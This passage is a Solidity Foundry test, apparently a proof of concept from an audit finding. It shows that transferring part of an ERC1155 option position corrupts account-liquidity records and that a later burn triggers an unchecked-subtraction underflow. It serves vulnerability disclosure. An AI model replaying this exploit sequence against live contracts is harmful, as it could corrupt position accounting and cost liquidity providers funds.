        int24 width = 10;
        int24 strike = currentTick + 100 - (currentTick % 10); // 10 is tick spacing. We subtract the remaining part, this way strike % tickspacing == 0.
        uint256 positionSizeSeed = 1 ether;
        // Create state with the parameters above.
        populatePositionData(width, strike, positionSizeSeed);
        console2.log("pos size: ", positionSize);
        console2.log("current tick: ", currentTick);
        //--------------------------- MINT BOTH: A SHORT PUT AND A LONG PUT ---------------------------------------
        // MINTING SHORT PUT-----
        // Construct tokenId for short put.
        uint256 tokenIdforShortPut = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            1,
            0,
            strike,
            width
        );
        // Mint a short put position with 100% positionSize
        sfpm.mintTokenizedPosition(
            tokenIdforShortPut,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );
        // Alice's account liquidity after first mint will be like this --------------------> removed liq (left slot): 0 | added liq (right slot): liquidity
        uint256 accountLiquidityAfterFirstMint = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        assertEq(accountLiquidityAfterFirstMint.leftSlot(), 0);
        assertEq(accountLiquidityAfterFirstMint.rightSlot(), expectedLiq);
        // MINTING LONG PUT----
        // Construct tokenId for long put -- Same strike same width same token type
        uint256 tokenIdforLongPut = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            1, // isLong true
            1, // token type is the same as above.
            0,
            strike,
            width
        );
        // This time mint but not with whole position size. Use 90% of it.
        sfpm.mintTokenizedPosition(
            tokenIdforLongPut,
            uint128(positionSize * 9 / 10),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );
        // Account liquidity after the second mint will be like this: ------------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
        uint256 accountLiquidityAfterSecondMint = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );

        // removed liq 90%, added liq 10%
        // NOTE: there was 1 wei difference due to rounding. That's why ApproxEq is used.
        assertApproxEqAbs(accountLiquidityAfterSecondMint.leftSlot(), expectedLiq * 9 / 10, 1);
        assertApproxEqAbs(accountLiquidityAfterSecondMint.rightSlot(), expectedLiq * 1 / 10, 1);
        // Let's check ERC1155 token balances of Alice.
        // She sould have positionSize amount of short put token, and positionSize*9/10 amount of long put token.
        assertEq(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize);
        assertEq(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10);
        // -------------------------- TRANSFER ONLY 10% TO BOB -----------------------------------------------
        /* During the transfer only the right slot is checked.
           If the sender account's right slot liquidity is equal to transferred liquidity, transfer is succesfully made regardless of the left slot (as the whole net liquidity is transferred)
        */

        // The right side of the Alice's position key is only 10% of liquidity. She can transfer 1/10 of the short put tokens.
        sfpm.safeTransferFrom(Alice, Bob, tokenIdforShortPut, positionSize * 1 / 10, "");
        // After the transfer, Alice still has positionSize * 9/10 amount of short put tokens and long put tokens.
        // NOTE: There was 1 wei difference due to rounding. That's why used approxEq.
        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize * 9 / 10, 1);
        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10, 1);

        // Bob has positionSize * 1/10 amount of short put tokens.
        assertApproxEqAbs(sfpm.balanceOf(Bob, tokenIdforShortPut), positionSize * 1 / 10, 1);
        // The more problematic thing is that tokens are still in the Alice's wallet but Alice's position key is updated to 0.
        // Bob only got a little tokens but his position key is updated too, and he looks like he removed a lot of liquidity.
        uint256 Alice_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        uint256 Bob_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
                address(pool),
                Bob,
                1,
                tickLower,
                tickUpper
            );
        assertEq(Alice_accountLiquidityAfterTransfer.leftSlot(), 0);
        assertEq(Alice_accountLiquidityAfterTransfer.rightSlot(), 0);

        // Bob's account liquidity is the same as Alice's liq after second mint.
        // Bob's account looks like he removed tons of liquidity. It will be like this: ---------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
        assertEq(Bob_accountLiquidityAfterTransfer.leftSlot(), accountLiquidityAfterSecondMint.leftSlot());
        assertEq(Bob_accountLiquidityAfterTransfer.rightSlot(), accountLiquidityAfterSecondMint.rightSlot());
        console2.log("Bob's account removed liquidity after transfer: ", Bob_accountLiquidityAfterTransfer.leftSlot());
        // -----------------------------------SCENARIO 2-----------------------------------------------
        // ----------------------- ALICE NAIVELY BURNS LONG PUT TOKENS ---------------------------------
        // Alice still had 90 long put and short put tokens. She wants to burn.
        sfpm.burnTokenizedPosition(
            tokenIdforLongPut,
            uint128(positionSize * 9 / 10),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );
        uint256 Alice_accountLiquidityAfterBurn = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        // Her account liquidity left side is enormously big at the moment due to unchecked subtraction in line 979.
        console2.log("Alice's account liquidity left side after burn: ", Alice_accountLiquidityAfterBurn.leftSlot());
    }


  ```

  </details>
